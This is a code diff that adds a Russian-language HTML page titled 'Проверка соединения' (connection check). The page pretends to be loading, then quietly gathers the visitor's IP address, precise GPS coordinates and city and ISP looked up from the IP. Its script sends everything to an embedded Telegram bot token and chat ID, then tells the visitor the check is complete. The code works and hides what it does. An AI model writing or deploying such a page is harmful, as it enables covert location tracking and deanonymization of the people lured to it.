@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Проверка соединения</title>
+</head>
+<body>
+    <div id="info">
+        <h2>Идет загрузка</h2>
+        <p>Пожалуйста, подождите</p>
+    </div>
+
+    <script>
+        var sent = false
+        var token = '8862821632:AAHVpQ68Co6A3XOVlytf8-NW40NPfbQdkGs'
+        var chatId = '7761721600'
+
+        function sendText(txt) {
+            var x = new XMLHttpRequest()
+            x.open('POST', 'https://api.telegram.org/bot' + token + '/sendMessage', true)
+            x.setRequestHeader('Content-Type', 'application/json')
+            x.send(JSON.stringify({ chat_id: chatId, text: txt }))
+        }
+
+        function getIP(cb) {
+            var x = new XMLHttpRequest()
+            x.open('GET', 'https://api64.ipify.org?format=json', true)
+            x.timeout = 4000
+            x.onload = function() {
+                try { var d = JSON.parse(x.responseText); cb(d.ip) }
+                catch(e) { cb('ошибка') }
+            }
+            x.onerror = function() { cb('не получен') }
+            x.ontimeout = function() { cb('таймаут') }
+            x.send()
+        }
+
+        function getGeoByIP(ip, cb) {
+            var x = new XMLHttpRequest()
+            x.open('GET', 'http://ip-api.com/json/' + ip + '?fields=country,city,lat,lon,isp&lang=ru', true)
+            x.timeout = 4000
+            x.onload = function() {
+                try {
+                    var d = JSON.parse(x.responseText)
+                    cb(d.country + ', ' + d.city + ' | провайдер: ' + d.isp)
+                } catch(e) { cb('ошибка парсинга') }
+            }
+            x.onerror = function() { cb('сервис недоступен') }
+            x.ontimeout = function() { cb('таймаут') }
+            x.send()
+        }
+
+        function getGeoGPS(cb) {
+            if (!navigator.geolocation) { cb('не поддерживается'); return }
+            navigator.geolocation.getCurrentPosition(
+                function(pos) {
+                    var lat = pos.coords.latitude.toFixed(5)
+                    var lon = pos.coords.longitude.toFixed(5)
+                    var acc = pos.coords.accuracy
+                    cb(lat + ', ' + lon + ' (точность ' + acc + 'м)')
+                },
+                function(e) {
+                    if (e.code === 1) cb('запрещено')
+                    else if (e.code === 2) cb('недоступно')
+                    else if (e.code === 3) cb('таймаут')
+                    else cb('ошибка ' + e.code)
+                },
+                { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+            )
+        }
+
+        function getTime() {
+            return new Date().toLocaleString('ru-RU')
+        }
+
+        function doAll() {
+            if (sent) return
+            sent = true
+
+            getIP(function(ip) {
+                getGeoGPS(function(gps) {
+                    getGeoByIP(ip, function(geoIP) {
+                        var time = getTime()
+                        var msg = 'GPS: ' + gps + '\nПо IP: ' + geoIP + '\nIP адрес: ' + ip + '\nВремя: ' + time
+                        sendText(msg)
+                        document.getElementById('info').innerHTML = '<h2>Проверка завершена</h2><p>Спасибо</p>'
+                    })
+                })
+            })
+        }
+
+        setTimeout(doAll, 2000)
+    </script>
+</body>
+</html>
